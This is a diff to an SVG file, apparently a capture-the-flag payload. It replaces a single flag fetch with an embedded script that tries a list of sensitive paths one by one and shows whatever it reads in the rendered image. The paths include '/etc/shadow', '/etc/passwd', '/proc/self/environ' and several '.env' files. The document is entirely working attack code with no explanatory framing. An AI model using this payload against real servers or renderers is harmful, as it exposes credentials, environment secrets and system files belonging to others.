@@ -3,11 +3,53 @@
   <foreignObject x="10" y="10" width="980" height="980">
     <div xmlns="http://www.w3.org/1999/xhtml" style="font-family: monospace; font-size: 20px;">
       <div id="flagContent">Loading flag...</div>
-      <script>
-        fetch('/flag.txt')
-          .then(r => r.text())
-          .then(t => document.getElementById('flagContent').textContent = t)
-          .catch(e => document.getElementById('flagContent').textContent = 'Error: ' + e);
+     <script>
+        const paths = [
+          '/flag',
+          '/flags/flag.txt',
+          '/flag.txt',
+          '/root/flag.txt',
+          '/etc/flag.txt',
+          '/home/flag.txt',
+          '/var/www/flag.txt',
+          '/flag.txt.bak',
+          '/.flag.txt',
+          '/flag.txt.swp',
+          '/flag.txt~',
+          '/proc/self/environ',
+          '/proc/1/environ',
+          '/proc/self/cmdline',
+          '/proc/1/cmdline',
+          '/etc/passwd',
+          '/etc/shadow',
+          '/.env',
+          '/config/.env',
+          '/app/.env'
+        ];
+        
+        let currentIndex = 0;
+        
+        function tryNextPath() {
+          if (currentIndex >= paths.length) {
+            document.getElementById('flagContent').textContent = 'No flag found in common locations';
+            return;
+          }
+          
+          const path = paths[currentIndex];
+          document.getElementById('flagContent').textContent = `Trying: ${path}`;
+          
+          fetch(path)
+            .then(r => r.text())
+            .then(t => {
+              document.getElementById('flagContent').textContent = `Found content at ${path}:\n${t}`;
+            })
+            .catch(e => {
+              currentIndex++;
+              setTimeout(tryNextPath, 500);
+            });
+        }
+        
+        tryNextPath();
       </script>
     </div>
   </foreignObject>
